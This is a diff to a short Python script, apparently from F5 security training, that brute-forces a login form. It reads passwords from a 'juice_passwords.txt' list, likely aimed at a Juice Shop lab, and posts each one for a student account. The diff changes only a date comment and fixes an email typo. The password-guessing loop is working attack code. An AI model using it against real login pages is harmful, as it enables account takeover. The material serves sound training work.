@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Created on Oct 28, 2020
+# Modified on May 3, 2023
 # F5 Global Services Training
 
 import sys
@@ -16,7 +16,7 @@ pwdfile = 'juice_passwords.txt'
 
 with open(pwdfile) as fp:
         for index, pwd in enumerate(fp):
-                payload = {"email": "studen1@f5.com", "password": pwd.replace('\n', '')}
+                payload = {"email": "student1@f5.com", "password": pwd.replace('\n', '')}
                 r = requests.post(url, data=payload, cookies=cookies)
                 print("{}: {}".format(str(payload), r.status_code))
                 if r.status_code == 200:
